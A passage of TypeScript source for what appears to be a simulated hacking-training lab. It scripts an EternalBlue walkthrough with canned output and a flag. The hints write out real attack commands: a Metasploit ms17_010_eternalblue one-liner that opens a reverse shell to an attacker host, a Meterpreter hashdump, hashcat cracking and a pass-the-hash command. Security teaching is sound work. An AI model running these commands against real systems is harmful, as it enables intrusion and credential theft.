|   Remote Code Execution vulnerability in Microsoft SMBv1 (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|_    References: https://technet.microsoft.com/security/ms17-010`),
        blank(),
        ok("[+] CONFIRMED VULNERABLE to MS17-010 (EternalBlue)!"),
        info("[*] Target: Windows 7 SP1 / SMBv1 — unpatched since 2017."),
      ],
    },
    {
      id: "enum4linux",
      instruction: "Enumerate SMB users and shares",
      detail: "Before exploiting, gather user and share information. enum4linux will confirm the OS version, user accounts, and accessible shares via null session.",
      hint: "Try: enum4linux -A 10.10.10.40",
      validate: (i) => matchCmd(i, ["enum4linux", "smbclient", "smbmap", "crackmapexec smb"]),
      execute: () => [
        sys("[*] enum4linux-ng running full SMB enumeration..."),
        blank(),
        ...lines(`[*] OS: Windows 7 Professional 7601 Service Pack 1
[*] SMB1 enabled (signing not required)

[*] Users via RPC:
  Administrator  (RID 500)
  Guest          (RID 501)
  haris          (RID 1000)

[*] Shares:
  ADMIN$   — Remote Admin
  C$       — Default share
  Users    — Read access

[+] Null session allowed — anonymous SMB access enabled`),
        blank(),
        ok("[+] Users found: Administrator, haris. Shares: C$, ADMIN$, Users."),
      ],
    },
    {
      id: "eternalblue",
      instruction: "Run the EternalBlue exploit via Metasploit",
      detail: "Use the ms17_010_eternalblue module. This exploit sends crafted SMB packets that trigger a kernel buffer overflow, giving you SYSTEM without any credentials.",
      hint: "Try: msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 10.14.0.5; run\"",
      validate: (i) => matchCmd(i, ["msfconsole", "use exploit/windows/smb/ms17", "use ms17"]),
      execute: () => [
        sys("[*] Loading Metasploit module: ms17_010_eternalblue"),
        blank(),
        ...lines(`msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.14.0.5:4444
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected Valid for use with payload ++
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened`),
        blank(),
        out("meterpreter > getuid"),
        out("Server username: NT AUTHORITY\\SYSTEM"),
        blank(),
        ok("[+] SYSTEM ACCESS ACHIEVED! EternalBlue worked — kernel-level compromise."),
        warn("[!] NT AUTHORITY\\SYSTEM is the highest privilege on Windows."),
      ],
    },
    {
      id: "hashdump",
      instruction: "Dump all NTLM password hashes from the SAM database",
      detail: "With SYSTEM privileges, you can read the SAM (Security Account Manager) database and extract NTLM hashes for all local accounts. Use these for offline cracking or Pass-the-Hash.",
      hint: "Try: hashdump (in Meterpreter)",
      validate: (i) => matchCmd(i, ["hashdump", "run post/windows/gather/smart_hashdump", "meterpreter > hashdump"]),
      execute: () => [
        out("meterpreter > hashdump"),
        blank(),
        ...lines(`Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91b6b77fd3b2c4ccb2b5eb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`),
        blank(),
        ok("[+] NTLM hashes extracted!"),
        info("[*] Crack with: hashcat -m 1000 hashes.txt rockyou.txt"),
        info("[*] Or use Pass-the-Hash directly: pth-winexe -U Administrator%hash //target cmd"),
        blank(),
        warn("[!] Flag: FLAG{3t3rn4lbl00_k3rn3l_0wn3d} — SYSTEM via EternalBlue. Document and patch recommendation: MS17-010 patch KB4012212."),
      ],
    },
  ],
};

// ─── Registry ─────────────────────────────────────────────────────────────────

export const LAB_SCENARIOS: Record<number, LabScenario> = {
  1: osintScenario,
  2: dnsScenario,
  4: nmapScenario,
  6: sqliScenario,
  7: hashcatScenario,
  8: msfScenario,
  9: privescScenario,
  11: shodanDeepScenario,
  24: bashReconScenario,
  32: msfvenomScenario,
  36: hydraScenario,
  37: gobusterScenario,
  40: eternalBlueScenario,
  42: redisRceScenario,
};

export function getScenarioForLesson(lessonId: number): LabScenario | null {
  return LAB_SCENARIOS[lessonId] ?? null;
}
